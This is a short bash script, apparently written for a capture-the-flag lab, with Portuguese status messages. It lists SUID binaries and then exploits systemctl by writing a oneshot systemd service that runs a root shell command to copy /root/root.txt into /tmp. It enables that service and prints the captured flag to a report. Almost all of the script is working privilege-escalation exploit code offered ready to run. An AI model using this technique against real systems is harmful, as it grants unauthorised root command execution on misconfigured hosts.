#!/bin/bash

REPORT="/tmp/privsec.txt"

echo "[*] PrivEsc iniciado..."

{
    echo "====================================================="
    echo "PRIVILEGE ESCALATION ANALYSIS"
    echo "====================================================="

    echo "[+] Checking SUID binaries..."
    find / -perm -4000 -type f 2>/dev/null

    echo ""
    echo "[+] Checking systemctl..."

    if command -v systemctl >/dev/null 2>&1; then
        echo "[+] systemctl encontrado"
        echo "[+] Tentando exploração..."

        TF=$(mktemp).service

        cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag.txt"
[Install]
WantedBy=multi-user.target
EOF

        systemctl link $TF 2>/dev/null
        systemctl enable --now $TF 2>/dev/null

        echo ""
        echo "[+] Resultado da exploração:"

        if [ -f /tmp/root_flag.txt ]; then
            echo "[SUCCESS] Root flag:"
            cat /tmp/root_flag.txt
        else
            echo "[FAILED] Exploit não funcionou"
        fi

    else
        echo "[-] systemctl não disponível"
    fi

} > "$REPORT"

echo "[+] Resultado salvo em $REPORT"